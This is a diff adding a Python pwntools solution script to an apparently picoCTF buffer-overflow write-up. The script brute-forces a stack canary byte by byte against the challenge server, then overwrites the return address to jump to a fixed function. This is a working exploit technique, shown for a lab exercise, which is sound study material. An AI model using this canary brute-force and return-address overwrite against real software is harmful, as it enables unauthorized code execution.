@@ -470,3 +470,33 @@ How Many Bytes will You Write Into the Buffer?
 Please create 'flag.txt' in this directory with your own debugging flag.
 [Inferior 1 (process 107530) exited normally]
 ```
+
+```python
+from pwn import process, p32, context, remote
+from tqdm import trange
+
+def get_canary():
+    canary = b""
+    for i in range(1, 5):
+        for c in trange(65, 256): #65 to speedup
+            with context.quiet:
+                #io = process("./vuln")
+                io = remote("saturn.picoctf.net", 54767)
+                io.sendlineafter(b"> ", str(64 + i).encode())
+                io.sendlineafter(b"> ", b'A'*64 + canary + chr(c).encode())
+                output = io.recvall()
+                io.close()
+            if b"?" in output:
+                canary += chr(c).encode()
+                break
+    return canary
+
+canary = get_canary()
+print(canary)
+
+io = process("./vuln")
+io.sendlineafter(b"> ", b"100")
+io.sendlineafter(b"> ", b'A'*64 + canary + b'B'*16 + p32(0x8049336))
+print(io.read())
+
+```
